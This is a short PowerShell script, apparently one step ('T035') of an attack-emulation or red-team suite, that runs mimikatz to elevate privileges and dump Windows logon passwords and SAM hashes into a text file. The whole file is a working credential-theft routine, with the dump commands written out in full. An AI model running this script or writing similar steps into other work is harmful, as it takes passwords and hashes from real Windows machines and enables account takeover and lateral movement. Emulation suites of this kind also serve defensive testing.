[CmdletBinding()]
param()
$ErrorActionPreference = "Stop"
$m = "C:\Tools\ADTools\mimikatz.exe"
if (-not (Test-Path $m)) { throw "mimikatz.exe not found" }
& $m "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" 2>&1 | Tee-Object C:\Tools\ADTools\T035-creds-out.txt
Write-Output "T035_OK: credential dump written to C:\Tools\ADTools\T035-creds-out.txt"
